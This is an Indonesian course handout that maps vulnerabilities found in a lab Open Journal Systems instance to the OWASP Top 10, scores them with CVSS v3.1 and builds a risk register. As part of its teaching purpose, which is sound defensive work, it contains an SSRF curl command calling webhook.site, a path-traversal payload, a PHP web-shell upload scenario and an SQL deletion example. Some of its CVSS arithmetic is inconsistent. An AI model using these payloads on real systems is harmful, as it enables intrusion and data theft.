# Pertemuan 4 — Analisis OWASP & Risk Scoring

## Tujuan Pembelajaran
Setelah pertemuan ini, mahasiswa mampu:
1. Memetakan temuan scanning ke kategori OWASP Top 10 2021
2. Menghitung risk score menggunakan CVSS v3.1
3. Memprioritaskan kerentanan berdasarkan tingkat risiko
4. Menyusun Risk Register yang terstruktur

---

## 1. OWASP Top 10 — 2021

OWASP Top 10 adalah daftar 10 risiko keamanan aplikasi web yang paling kritis, diperbarui secara berkala oleh komunitas OWASP.

| Kode | Kategori | Relevansi pada OJS |
|---|---|---|
| **A01** | Broken Access Control | Path Traversal pada 33 grid endpoint, IDOR pada SubmissionFileManager, role bypass ASSISTANT/SUB_EDITOR |
| **A02** | Cryptographic Failures | Tidak ditemukan bukti terkait cryptographic failure dalam scope assessment |
| **A03** | Injection | SQL Injection latent di DAO.inc.php, XSS via PKPTemplateManager tanpa sanitasi |
| **A04** | Insecure Design | File upload tanpa validasi MIME/ekstensi (RCE risk), null dereference DoS di PdfJsViewerPlugin |
| **A05** | Security Misconfiguration | phpinfo() exposed, directory indexing terbuka, cookie tanpa HttpOnly/SameSite, CSP tidak ada, CORS permisif, server version leak |
| **A06** | Vulnerable & Outdated Components | jQuery/Plupload versi lama dengan CVE terdokumentasi |
| **A07** | Identification & Authentication Failures | Tidak ditemukan bukti terkait authentication failure (misalnya brute-force protection) dalam pengujian |
| **A08** | Software & Data Integrity Failures | `unserialize()` tanpa validasi di DAO.inc.php — PHP Object Injection risk |
| **A09** | Security Logging & Monitoring Failures | Tidak ditemukan bukti terkait logging dan monitoring dalam assessment ini |
| **A10** | Server-Side Request Forgery (SSRF) | CVE-2021-27188 pada journal stylesheet URL — **terkonfirmasi via webhook.site** |

---

## 2. Pemetaan Temuan ke OWASP Top 10

### Cara Kerja Pemetaan

Setiap temuan dari Pertemuan 3 dipetakan ke:
1. **Kategori OWASP** (A01–A10)
2. **CWE (Common Weakness Enumeration)** — nomor kelemahan
3. **CVE** (jika ada kerentanan yang sudah terdaftar)

### Tabel Pemetaan Temuan OJS

| ID | Deskripsi | OWASP | CWE | CVE | Sumber |
|---|---|---|---|---|---|
| VUL-001 | SSRF via journal stylesheet URL — Journal Manager dapat mengarahkan server untuk fetch URL arbitrer, termasuk internal service dan cloud metadata endpoint | **A10** | CWE-918 | CVE-2021-27188 | DAST (Manual) |
| VUL-002 | Path Traversal pada 33 grid endpoint — parameter `stageId`, `submissionId`, `selectedFiles[0]`, dll tidak divalidasi, mengindikasikan potensi traversal di luar direktori yang diizinkan berdasarkan hasil scanning OWASP ZAP | **A01** | CWE-22 | — | DAST (ZAP) |
| VUL-003 | SQL Injection potential — interpolasi `$tableName` dan `$idFieldName` langsung ke SQL query di `DAO.inc.php` tanpa parameterisasi, membuka risiko SQLi dan operasi destruktif (DELETE) | **A03** | CWE-89 | — | SAST (Manual) |
| VUL-004 | SQL Injection potential — `PKPWorkflowHandler.inc.php` baris 405 dan `PKPAuthorDashboardHandler.inc.php` baris 351 menggunakan pola query tidak aman yang terdeteksi PHPCS | **A03** | CWE-89 | — | SAST (PHPCS) |
| VUL-005 | XSS — `PKPTemplateManager.inc.php` menghubungkan nilai `searchDescription` dan label field form ke HTML output tanpa `htmlspecialchars()`, membuka attack surface XSS luas | **A03** | CWE-79 | — | SAST (Manual) |
| VUL-006 | Insecure Deserialization — `unserialize()` digunakan sebagai fallback di `DAO.inc.php` saat `json_decode()` gagal untuk data bertipe object/array dari database, rentan PHP Object Injection | **A08** | CWE-502 | — | SAST (Manual) |
| VUL-007 | File Upload tanpa validasi — `SubmissionFileManager.inc.php` tidak memvalidasi tipe file, ekstensi, MIME type, maupun ukuran. Jika server mengeksekusi PHP di direktori upload, ini menjadi RCE | **A04** | CWE-434 | — | SAST (Manual) |
| VUL-008 | IDOR pada `SubmissionFileManager` — `assocId` diambil dari objek `$submissionFile` tanpa verifikasi kepemilikan, memungkinkan Author mengaitkan file ke galley milik submission author lain | **A01** | CWE-639 | — | SAST (Manual) |
| VUL-009 | Broken Access Control — role `ASSISTANT` dan `SUB_EDITOR` mendapat bypass di `OjsJournalMustPublishPolicy` untuk konten unpublished, seharusnya hanya `SITE_ADMIN` dan `MANAGER` | **A01** | CWE-284 | — | SAST (Manual) |
| VUL-010 | DoS via null dereference — `PdfJsViewerPlugin` tidak memvalidasi return value `getFile()`, sehingga null dapat menyebabkan Fatal Error dan mengganggu availability layanan | **A04** | CWE-476 | — | SAST (Manual) |
| VUL-011 | `phpinfo()` exposed — `AdminHandler.inc.php` baris 374–375 memanggil `phpinfo()` pada endpoint yang dapat diakses, mengekspos konfigurasi PHP, path server, dan environment variable | **A05** | CWE-200 | — | SAST (PHPCS) |
| VUL-012 | Directory Indexing terbuka pada 6 path (`/cache/`, `/docs/`, `/lib/`, `/locale/`, `/public/`, `/styles/`) memungkinkan attacker melihat struktur direktori dan file sensitif | **A05** | CWE-548 | — | DAST (Nikto) |
| VUL-013 | IP internal terekspos via HTTP Location header — server mengungkap alamat IP private pada response redirect | **A05** | CWE-200 | CVE-2000-0649 | DAST (Nikto) |
| VUL-014 | Vulnerable JS Library — `build.js` dan `jquery.validate.min.js` menggunakan jQuery/Plupload versi lama yang berpotensi mengandung CVE terdokumentasi | **A06** | CWE-1035 | — | DAST (ZAP) |
| VUL-015 | CSP Header tidak dikonfigurasi pada 5 endpoint kritis termasuk halaman login dan settings, meningkatkan risiko XSS dan clickjacking | **A05** | CWE-693 | — | DAST (ZAP) |
| VUL-016 | Cookie `OJSSID` tidak memiliki flag `HttpOnly` dan `SameSite`, memungkinkan akses JavaScript ke session cookie dan serangan CSRF | **A05** | CWE-1004 | — | DAST (ZAP) |
| VUL-017 | Cross-Domain Misconfiguration (CORS) — API submissions dikonfigurasi terlalu permisif, memungkinkan request cross-origin yang tidak sah | **A05** | CWE-942 | — | DAST (ZAP) |
| VUL-018 | Server version leak via HTTP Header — Apache dan versi OJS terekspos di response header, memudahkan attacker reconnaissance | **A05** | CWE-200 | — | DAST (ZAP/Nikto) |

### Distribusi per Kategori OWASP

| Kategori OWASP | Jumlah Temuan | ID Temuan |
|---|---|---|
| A01 — Broken Access Control | 3 | VUL-002, VUL-008, VUL-009 |
| A03 — Injection | 3 | VUL-003, VUL-004, VUL-005 |
| A04 — Insecure Design | 2 | VUL-007, VUL-010 |
| A05 — Security Misconfiguration | 7 | VUL-011, VUL-012, VUL-013, VUL-015, VUL-016, VUL-017, VUL-018 |
| A06 — Vulnerable & Outdated Components | 1 | VUL-014 |
| A08 — Software & Data Integrity Failures | 1 | VUL-006 |
| A10 — Server-Side Request Forgery | 1 | VUL-001 |
| **Total** | **18** | |

---

## 3. CVSS v3.1 — Scoring Kerentanan

### 3.1 Apa itu CVSS?

**CVSS (Common Vulnerability Scoring System)** adalah standar industri untuk menilai tingkat keparahan suatu kerentanan. Skor berkisar dari **0.0 (None)** hingga **10.0 (Critical)**.

### 3.2 Komponen CVSS v3.1

#### Base Score Metrics

**Attack Vector (AV) — Vektor Serangan:**

| Nilai | Kode | Deskripsi | Skor |
|---|---|---|---|
| Network | N | Exploitable dari jaringan | 0.85 |
| Adjacent | A | Perlu akses jaringan yang sama | 0.62 |
| Local | L | Akses lokal diperlukan | 0.55 |
| Physical | P | Akses fisik ke perangkat | 0.20 |

**Attack Complexity (AC) — Kompleksitas Serangan:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| Low (L) | Tidak ada kondisi khusus yang diperlukan | 0.77 |
| High (H) | Memerlukan kondisi tertentu yang tidak selalu terpenuhi | 0.44 |

**Privileges Required (PR) — Hak Akses yang Dibutuhkan:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak perlu autentikasi | 0.85 |
| Low (L) | Autentikasi dasar diperlukan | 0.62 / 0.50 |
| High (H) | Hak akses tinggi (Admin) | 0.27 / 0.50 |

**User Interaction (UI) — Interaksi Pengguna:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak diperlukan interaksi korban | 0.85 |
| Required (R) | Korban harus melakukan tindakan | 0.62 |

**Scope (S) — Dampak Scope:**

| Nilai | Deskripsi |
|---|---|
| Unchanged (U) | Komponen yang terpengaruh sama dengan komponen yang dieksploitasi |
| Changed (C) | Exploit dapat mempengaruhi komponen di luar scope awal |

**Confidentiality, Integrity, Availability (C/I/A) Impact:**

| Nilai | Deskripsi | Skor |
|---|---|---|
| None (N) | Tidak ada dampak | 0.00 |
| Low (L) | Dampak terbatas | 0.22 |
| High (H) | Dampak total/sepenuhnya terpengaruh | 0.56 |

### 3.3 Interpretasi Skor CVSS

| Skor | Rating | Tindakan yang Disarankan |
|---|---|---|
| 0.0 | None | Tidak ada tindakan |
| 0.1 – 3.9 | Low | Perbaiki dalam siklus rutin |
| 4.0 – 6.9 | Medium | Perbaiki dalam 30 hari |
| 7.0 – 8.9 | High | Perbaiki dalam 7 hari |
| 9.0 – 10.0 | Critical | Perbaiki segera (hotfix) |

---

## 4. Hasil Kalkulasi CVSS — Studi Kasus OJS

### Kasus 1: SSRF via Journal Stylesheet — VUL-001 (CVE-2021-27188) ✅ Terkonfirmasi

**Skenario:** Journal Manager/Editor dapat mengatur URL stylesheet pada halaman pengaturan website OJS. Server memproses URL tersebut secara server-side, memungkinkan attacker mengarahkan request ke internal service atau server eksternal. **Berhasil direproduksi** menggunakan `curl` dengan session aktif, dikonfirmasi via webhook.site.

**Bukti DAST:**
```bash
$ curl -b "ojsSession=gqmqg8cat4epfgm9mpe3dkdvf6" \
  -X POST http://10.34.100.179/index.php/jnads/management/settings/website \
  --data "styleSheet[uploadedFile]=https://webhook.site/35f2a429-1321-408e-bd72-1c80b6faf006/evil.css"
# → Request masuk ke webhook.site ✓ (SSRF confirmed)
```

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N

Penjelasan:
  AV:N  → Exploitable via internet (Network)
  AC:L  → Tidak ada kondisi khusus
  PR:L  → Butuh akun Editor/Journal Manager (Low privilege)
  UI:N  → Tidak butuh interaksi korban
  S:C   → Dapat mengakses internal service/cloud metadata → Scope Changed
  C:H   → Potensi baca konfigurasi server, token cloud, metadata AWS/GCP
  I:N   → Tidak memodifikasi data secara langsung
  A:N   → Tidak mengganggu availability

Base Score: 7.7 → HIGH
```

**Kalkulasi Manual:**

$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0) \times (1-0) = 0.56$$

$$\text{ISS (Scope Changed)} = 7.52 \times (0.56 - 0.029) \times 1.08 = 4.31$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$

$$\text{Base Score} = \text{Roundup}(\min(4.31 + 2.27, 10)) = \mathbf{7.7}$$

---

### Kasus 2: SQL Injection Potential — VUL-003 (DAO.inc.php)

**Skenario:** Method `getDataObjectSettings()` dan query DELETE di `lib/pkp/classes/db/DAO.inc.php` menginterpolasi `$tableName` dan `$idFieldName` langsung ke dalam SQL string tanpa parameterisasi. Meskipun `$idFieldValue` sudah menggunakan prepared statement (`?`), nama tabel dan kolom tidak bisa diparameterisasi via PDO, sehingga jika nilai ini berasal dari input eksternal, attacker bisa melakukan SQL Injection atau DROP TABLE. Meskipun dampak potensialnya sangat tinggi, eksploitasi praktis bergantung pada kemampuan attacker untuk mengontrol parameter struktural query (seperti $tableName dan $idFieldName), yang tidak terbukti dapat dikendalikan secara langsung melalui input HTTP dalam pengujian DAST.

**Bukti SAST (Manual Code Review):**
```php
// DAO.inc.php — getDataObjectSettings()
$sql = "SELECT * FROM $tableName WHERE $idFieldName = ?";
// ↑ $tableName dan $idFieldName interpolasi langsung → SQL Injection risk

// DAO.inc.php — deleteSettings()
$removeSql = 'DELETE FROM '.$tableName.' WHERE '.$removeWhere;
// ↑ Operasi destruktif — jika $tableName bisa dimanipulasi → DROP TABLE
```

**Catatan:** SQLMap tidak menemukan SQLi aktif pada parameter POST/GET yang diuji (login, search). Kerentanan ini bersifat **code-level/latent** dan bergantung pada apakah `$tableName` bisa dikontrol dari luar. Risiko tetap signifikan karena pattern ini berpotensi muncul di berbagai method DAO.

```
CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H

Penjelasan:
  AV:N  → Via internet
  AC:H  → Memerlukan kondisi tertentu ($tableName harus bisa dikontrol dari input eksternal)
  PR:L  → Butuh autentikasi minimal (context tertentu)
  UI:N  → Tidak perlu interaksi
  S:U   → Scope tidak berubah
  C:H   → Bisa baca semua data DB termasuk password hash
  I:H   → Bisa tulis/hapus data
  A:H   → Bisa DROP TABLE / crash DB

Base Score: 8.1 → HIGH
```

**Kalkulasi Manual:**

$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$

$$\text{ISS (Scope Unchanged)} = \min(0.915, 0.915) \Rightarrow f(ISC) = 6.42 \times 0.915 - 1.5 = 4.37$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.44 \times 0.62 \times 0.85 = 1.62$$

$$\text{Base Score} = \text{Roundup}(\min(4.37 + 1.62, 10)) = \mathbf{8.1}$$

---

### Kasus 3: Insecure Deserialization — VUL-006 (DAO.inc.php)

**Skenario:** `DAO.inc.php` menggunakan `unserialize()` sebagai fallback saat `json_decode()` gagal untuk data bertipe `object`/`array` yang dibaca dari database. Jika database pernah terkompromi, atau terdapat data lama yang bisa dimanipulasi, attacker dapat menyisipkan PHP Object Injection payload yang dieksekusi saat deserialisasi, berpotensi mengarah ke Remote Code Execution (RCE).

**Bukti SAST (Manual Code Review):**
```php
// DAO.inc.php
case 'object':
case 'array':
    $decodedValue = json_decode($value, true);
    if (!is_null($decodedValue)) {
        $value = $decodedValue;
    } else {
        $value = unserialize($value); // ← DANGEROUS: PHP Object Injection risk
    }
    break;
```

```
CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H

Penjelasan:
  AV:N  → Dieksploitasi via network (jika DB bisa dimanipulasi)
  AC:H  → Memerlukan kondisi DB yang sudah terkompromi
  PR:N  → Tidak perlu autentikasi jika DB bisa diakses langsung
  UI:N  → Tidak perlu interaksi
  S:U   → Scope tidak berubah
  C:H   → Potensi RCE → akses penuh sistem
  I:H   → Modifikasi/penghapusan data
  A:H   → Crash aplikasi / sistem

Base Score: 8.0 → HIGH
```

**Kalkulasi Manual:**

$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$

$$\text{ISS (Scope Unchanged)} = 6.42 \times 0.915 - 1.5 = 4.37$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.44 \times 0.85 \times 0.85 = 2.22$$

$$\text{Base Score} = \text{Roundup}(\min(4.37 + 2.22, 10)) = \mathbf{8.0}$$

---

### Kasus 4: File Upload tanpa Validasi — VUL-007 (SubmissionFileManager)

**Skenario:** Method `insertObject()` di `SubmissionFileManager.inc.php` langsung menyimpan file yang diupload ke database tanpa melakukan validasi apapun terhadap tipe file, ekstensi, MIME type, maupun ukuran file. Jika server memiliki konfigurasi yang mengizinkan eksekusi PHP pada direktori upload, attacker dengan akun Author dapat mengupload PHP shell dan mendapatkan Remote Code Execution.

**Bukti SAST (Manual Code Review):**
```php
// SubmissionFileManager.inc.php
public function insertObject($submissionFile) {
    parent::insertObject($submissionFile);
    // ← Tidak ada validasi ekstensi file
    // ← Tidak ada validasi MIME type
    // ← Tidak ada validasi ukuran file
    // ← Tidak ada validasi nama file (path traversal risk)
    if ($submissionFile->getData('assocType') === ASSOC_TYPE_REPRESENTATION) {
        $galley = $galleyDao->getById($submissionFile->getData('assocId'));
        // ← assocId tidak dicek apakah integer, positif, atau milik submission ini
    }
}
```

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H

Penjelasan:
  AV:N  → Dieksploitasi via internet
  AC:L  → Tidak ada kondisi khusus yang sulit dipenuhi
  PR:L  → Butuh akun Author/Reviewer (Low privilege)
  UI:N  → Tidak butuh interaksi korban
  S:C   → Jika PHP shell berhasil dieksekusi → Scope Changed (server takeover)
  C:H   → Akses penuh ke file sistem
  I:H   → Modifikasi file sistem / database
  A:H   → Crash layanan / sistem

Base Score: 9.0 → CRITICAL
```

**Kalkulasi Manual:**

$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.56) \times (1-0.56) = 0.915$$

$$\text{ISS (Scope Changed)} = 7.52 \times (0.915 - 0.029) \times 1.08 = 7.19$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$

$$\text{Base Score} = \text{Roundup}(\min(7.19 + 2.27, 10)) = \mathbf{9.0}$$

---

### Kasus 5: Path Traversal pada Grid Endpoint — VUL-002

**Skenario:** OWASP ZAP menemukan 33 endpoint yang berpotensi rentan terhadap Path Traversal, terutama pada URL grid admin dan article galleys. Parameter seperti `_`, `publicationId`, `stageId`, `selectedFiles[0]`, dan `submissionId` tidak divalidasi dengan benar, memungkinkan attacker menavigasi keluar dari direktori yang seharusnya dan mengakses file sensitif di server.

**Bukti DAST (OWASP ZAP):**
```
Alert: Path Traversal — Risk: High | Count: 33
URLs:
  - http://10.34.100.179/index.php/index/$$$call$$$/grid/admin/languages/.../fetch-grid
  - http://10.34.100.179/index.php/jnads/$$$call$$$/grid/article-galleys/.../fetch-grid
Parameters: _, publicationId, stageId, selectedFiles[0], reviewRoundId, submissionId
```

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N

Penjelasan:
  AV:N  → Exploitable via internet
  AC:L  → Tidak ada kondisi khusus
  PR:L  → Butuh autentikasi dasar
  UI:N  → Tidak perlu interaksi
  S:U   → Tidak keluar scope sistem utama
  C:H   → Bisa baca file konfigurasi sensitif (config.inc.php, .env, credentials)
  I:L   → Potensi modifikasi terbatas
  A:N   → Tidak mengganggu availability

Base Score: 7.5 → HIGH
```

**Kalkulasi Manual:**

$$\text{ISC}_{base} = 1 - (1-0.56) \times (1-0.22) \times (1-0) = 0.657$$

$$\text{ISS (Scope Unchanged)} = 6.42 \times 0.657 - 1.5 = 2.72$$

$$\text{Exploitability} = 8.22 \times 0.85 \times 0.77 \times 0.62 \times 0.85 = 2.27$$

$$\text{Base Score} = \text{Roundup}(\min(2.72 + 2.27, 10)) = \mathbf{7.5}$$

---

## 5. Risk Register

### 5.1 Formula Risk (OWASP Risk Rating Methodology)

```
Likelihood = (Threat Agent Factors + Vulnerability Factors) / 2
Impact     = (Technical Impact + Business Impact) / 2
Risk Score = Likelihood × Impact
```

### 5.2 Risk Register OJS — Lengkap 18 Temuan

| ID | Kerentanan | OWASP | CVSS Score | Rating | Likelihood | Business Impact | Risk | Prioritas |
|---|---|---|---|---|---|---|---|---|
| VUL-001 | SSRF via journal stylesheet URL (CVE-2021-27188) — Terkonfirmasi | A10 | 7.7 | High | 4 (High) | 4 (High — infrastruktur) | **High** | 1 |
| VUL-002 | Path Traversal pada 33 grid endpoint | A01 | 7.5 | High | 4 (High) | 4 (High — akses file sensitif) | **High** | 2 |
| VUL-003 | SQL Injection potential — interpolasi `$tableName`/`$idFieldName` di `DAO.inc.php` | A03 | 8.1 | High | 2 (Low) | 5 (Critical — kebocoran DB) | **High** | 2 |
| VUL-004 | SQL Injection potential — `PKPWorkflowHandler` & `PKPAuthorDashboardHandler` | A03 | 6.3 | Medium | 2 (Low) | 4 (High) | **Medium** | 3 |
| VUL-005 | XSS — `PKPTemplateManager` tanpa `htmlspecialchars()` (searchDescription, fieldset) | A03 | 6.1 | Medium | 3 (Medium) | 3 (Medium — session hijack) | **Medium** | 3 |
| VUL-006 | Insecure Deserialization — `unserialize()` pada data dari database di `DAO.inc.php` | A08 | 8.0 | High | 2 (Low) | 5 (Critical — RCE) | **High** | 2 |
| VUL-007 | File Upload tanpa validasi tipe/MIME/ukuran di `SubmissionFileManager` | A04 | 9.0 | Critical | 3 (Medium) | 5 (Critical — RCE via malicious file) | **Critical** | 1 |
| VUL-008 | IDOR pada `SubmissionFileManager` — `assocId` tanpa validasi kepemilikan | A01 | 6.5 | Medium | 3 (Medium) | 4 (High — privasi data) | **High** | 3 |
| VUL-009 | Broken Access Control — role ASSISTANT/SUB_EDITOR bypass konten unpublished | A01 | 6.4 | Medium | 3 (Medium) | 3 (Medium) | **Medium** | 4 |
| VUL-010 | DoS potential — null dereference di `PdfJsViewerPlugin` (Fatal Error) | A04 | 5.3 | Medium | 4 (High) | 3 (Medium — availability) | **Medium** | 4 |
| VUL-011 | `phpinfo()` exposed di `AdminHandler.inc.php` (baris 374–375) | A05 | 5.3 | Medium | 5 (Very High) | 3 (Medium — info disclosure) | **Medium** | 3 |
| VUL-012 | Directory Indexing terbuka pada 6 path (`/cache/`, `/docs/`, `/lib/`, dll) | A05 | 5.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 4 |
| VUL-013 | IP internal terekspos via HTTP Location header (CVE-2000-0649) | A05 | 5.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 4 |
| VUL-014 | Vulnerable JS Library — jQuery/Plupload versi lama (build.js, validate.min.js) | A06 | 6.1 | Medium | 4 (High) | 3 (Medium) | **Medium** | 3 |
| VUL-015 | CSP Header tidak ada — 5 endpoint kritis (login, settings) | A05 | 4.3 | Medium | 5 (Very High) | 2 (Low) | **Medium** | 5 |
| VUL-016 | Cookie `OJSSID` tanpa flag `HttpOnly` dan `SameSite` | A05 | 4.3 | Medium | 4 (High) | 3 (Medium — session hijack) | **Medium** | 4 |
| VUL-017 | Cross-Domain Misconfiguration (CORS) pada API submissions | A05 | 4.3 | Medium | 3 (Medium) | 3 (Medium) | **Medium** | 5 |
| VUL-018 | Server version leak via HTTP Header (Apache/OJS versi terekspos) | A05 | 3.7 | Low | 5 (Very High) | 1 (Info) | **Low** | 6 |

### 5.3 Likelihood Scale

| Skor | Level | Deskripsi |
|---|---|---|
| 1 | Very Low | Sulit dieksploitasi, butuh skill tinggi |
| 2 | Low | Membutuhkan kondisi tertentu |
| 3 | Medium | Aktor dengan kemampuan rata-rata bisa mengeksploitasi |
| 4 | High | Mudah dieksploitasi, banyak tools otomatis |
| 5 | Very High | Otomatis dan sangat mudah |

### 5.4 Business Impact Scale

| Skor | Level | Dampak |
|---|---|---|
| 1 | Minimal | Tidak ada dampak signifikan |
| 2 | Low | Gangguan minor, tidak ada data leak |
| 3 | Medium | Gangguan signifikan, reputasi terdampak |
| 4 | High | Kebocoran data pengguna, denda regulasi |
| 5 | Critical | Kompromi sistem penuh, RCE, data breach masif |

---

## 6. Visualisasi Risk Matrix

Pemetaan semua 18 temuan ke dalam matriks 5×5 (Likelihood × Business Impact):

<img width="475" height="384" alt="Desain tanpa judul" src="https://github.com/user-attachments/assets/cd4c5e5a-e302-4ff8-8df4-d077d217c8e5" />


Catatan:
Beberapa kerentanan seperti VUL-003 dan VUL-006 tetap diklasifikasikan 
dalam zona Critical meskipun memiliki likelihood rendah, karena dampaknya 
bersifat sistemik (full data compromise atau RCE) jika kondisi eksploitasi terpenuhi.

**Legenda Zona Risiko:**

| Simbol | Zona | Kondisi | Temuan |
|---|---|---|---|
| 🔴 | CRITICAL | Business Impact 5 + Likelihood ≥ 3 | VUL-007 |
| 🟠 | HIGH | Business Impact 4–5 + Likelihood 2–4; atau BI 3 + Likelihood ≥ 4 | VUL-001, VUL-002, VUL-003, VUL-006, VUL-008 |
| 🟡 | MEDIUM | Business Impact 2–3 + Likelihood 3–5; atau BI 4 + Likelihood 2 | VUL-004, VUL-005, VUL-009, VUL-010, VUL-011, VUL-012, VUL-013, VUL-014, VUL-015, VUL-016, VUL-017 |
| 🟢 | LOW | Business Impact 1 + Likelihood ≤ 5 | VUL-018 |

**Ringkasan distribusi:**
- 🔴 Critical : 1 temuan — VUL-007
- 🟠 High     : 5 temuan — VUL-001, VUL-002, VUL-003, VUL-006, VUL-008
- 🟡 Medium   : 11 temuan — VUL-004 s/d VUL-005, VUL-009 s/d VUL-017
- 🟢 Low      : 1 temuan — VUL-018

---

## 7. Analisis Per Kategori OWASP

### A01 — Broken Access Control

Tiga temuan pada kategori ini menunjukkan pola yang konsisten: validasi otorisasi pada OJS tidak mengikuti prinsip *defense-in-depth*. Temuan paling signifikan adalah Path Traversal (VUL-002) yang ditemukan OWASP ZAP pada 33 endpoint grid, mengindikasikan bahwa framework routing OJS tidak secara konsisten memvalidasi apakah nilai parameter seperti `stageId` atau `submissionId` benar-benar milik user yang sedang terautentikasi.

**Bukti — Path Traversal (VUL-002):**
```
Alert: Path Traversal — Risk: High | Count: 33
URLs affected:
  - http://10.34.100.179/index.php/index/$$$call$$$/grid/admin/languages/.../fetch-grid
  - http://10.34.100.179/index.php/jnads/$$$call$$$/grid/article-galleys/.../fetch-grid
Parameters: _, publicationId, stageId, selectedFiles[0], reviewRoundId, submissionId
Evidence: ZAP mendeteksi indikasi Path Traversal berdasarkan response pattern 
          dan penggunaan payload seperti ../../../../etc/passwd. Namun, akses langsung 
          ke file sensitif belum terkonfirmasi dalam pengujian ini..
```

Dari sisi SAST, manual code review pada `SubmissionFileManager.inc.php` mengungkapkan IDOR (VUL-008) di mana `assocId` diambil dari objek `$submissionFile` tanpa memverifikasi apakah galley yang dirujuk benar-benar milik submission yang sama.

**Bukti — IDOR (VUL-008):**
```php
// SubmissionFileManager.inc.php
if ($submissionFile->getData('assocType') === ASSOC_TYPE_REPRESENTATION) {
    $galley = $galleyDao->getById($submissionFile->getData('assocId'));
    // ← assocId tidak divalidasi kepemilikan:
    //   Tidak ada cek: apakah galley ini milik submission yang sama?
    //   Tidak ada cek: apakah assocId adalah integer positif yang valid?
    // → Author A bisa mengaitkan file ke galley milik Author B
```

Temuan ketiga, yaitu role bypass (VUL-009) pada `OjsJournalMustPublishPolicy`, menunjukkan bahwa role `ASSISTANT` dan `SUB_EDITOR` diberikan hak bypass ke konten yang belum dipublish.

**Bukti — Role Bypass (VUL-009):**
```php
// OjsJournalMustPublishPolicy.inc.php
$allowedRoles = [ROLE_ID_SITE_ADMIN, ROLE_ID_MANAGER, 
                 ROLE_ID_ASSISTANT, ROLE_ID_SUB_EDITOR]; // ← Seharusnya SITE_ADMIN & MANAGER saja
// → ASSISTANT dan SUB_EDITOR bisa mengakses konten unpublished
//   yang seharusnya tidak terlihat sebelum proses review selesai
```

---

### A03 — Injection

Kategori Injection menghasilkan tiga temuan dari kombinasi SAST PHPCS dan manual code review. Temuan paling kritis secara struktural adalah interpolasi langsung `$tableName` dan `$idFieldName` ke dalam SQL query di `DAO.inc.php` (VUL-003).

**Bukti — SQL Injection Latent (VUL-003):**
```php
// DAO.inc.php — getDataObjectSettings()
$sql = "SELECT * FROM $tableName WHERE $idFieldName = ?";
//                    ↑                ↑
//                    Interpolasi langsung — SQL Injection risk
//                    Prepared statement hanya melindungi $idFieldValue,
//                    bukan nama tabel/kolom

// DAO.inc.php — deleteSettings() — OPERASI DESTRUKTIF
$removeSql = 'DELETE FROM '.$tableName.' WHERE '.$removeWhere;
//                          ↑ Jika $tableName bisa dimanipulasi:
//                            DELETE FROM users WHERE 1=1 → hapus semua user
//                            atau injeksi DROP TABLE
```

PHPCS juga mendeteksi pola serupa pada handler-handler lain (VUL-004):

**Bukti — SQL Injection PHPCS (VUL-004):**
```
PHPCS Alert:
  PKPWorkflowHandler.inc.php line 405:
    "Possible SQL injection vulnerability: variable $stageId used directly in query"
  PKPAuthorDashboardHandler.inc.php line 351:
    "Possible SQL injection vulnerability: variable $submissionId used in query"
```

Untuk XSS, manual code review menemukan bahwa `PKPTemplateManager.inc.php` menghubungkan nilai `searchDescription` dan beberapa label field form langsung ke HTML output tanpa `htmlspecialchars()` (VUL-005).

**Bukti — XSS via PKPTemplateManager (VUL-005):**
```php
// PKPTemplateManager.inc.php
$templateVars['searchDescription'] = $request->getUserVar('searchDescription');
// ↑ Nilai dari user input langsung dimasukkan ke template variable

// Di template Smarty:
{$searchDescription}  // ← Output tanpa escape → XSS jika tidak di-sanitize oleh Smarty
// Konfirmasi: ZAP mendeteksi "User Controllable HTML Element Attribute" pada field ini
```

---

### A04 — Insecure Design

Dua temuan pada kategori ini mencerminkan kelemahan pada level desain. File upload tanpa validasi (VUL-007) adalah temuan paling kritis dalam keseluruhan assessment ini.

**Bukti — File Upload tanpa Validasi (VUL-007):**
```php
// SubmissionFileManager.inc.php
public function insertObject($submissionFile) {
    parent::insertObject($submissionFile);
    // ← TIDAK ADA: whitelist ekstensi (.pdf, .doc, .txt)
    // ← TIDAK ADA: server-side MIME detection (finfo_file())
    // ← TIDAK ADA: batas ukuran file (MAX_FILE_SIZE check)
    // ← TIDAK ADA: sanitasi nama file (../../../shell.php bisa lolos)
    
    // Skenario eksploitasi:
    // 1. Author upload file "shell.php" sebagai submission file
    // 2. File tersimpan di direktori upload OJS
    // 3. Jika Apache/PHP mengizinkan eksekusi di direktori itu → RCE
    // 4. Attacker akses http://10.34.100.179/upload/shell.php?cmd=whoami
```

Temuan kedua (VUL-010) adalah null dereference pada `PdfJsViewerPlugin`:

**Bukti — DoS via Null Dereference (VUL-010):**
```php
// PdfJsViewerPlugin.inc.php
$file = $submissionFileDao->getLatestRevision($fileId);
$filePath = $file->getFilePath(); // ← Fatal Error jika $file == null
// Tidak ada pengecekan: if ($file === null) { return; }
// 
// Cara eksploitasi:
// GET /index.php/jnads/article/view/[id]/[invalid_file_id]
// → $file = null → getFilePath() pada null → PHP Fatal Error
// → Halaman artikel tidak dapat diakses → DoS terbatas
```

---

### A05 — Security Misconfiguration

Dengan 7 temuan, A05 adalah kategori dengan jumlah temuan terbanyak. Mayoritas berasal dari DAST (Nikto dan ZAP).

**Bukti — phpinfo() Exposed (VUL-011):**
```
URL: http://10.34.100.179/index.php/index/admin/phpinfo
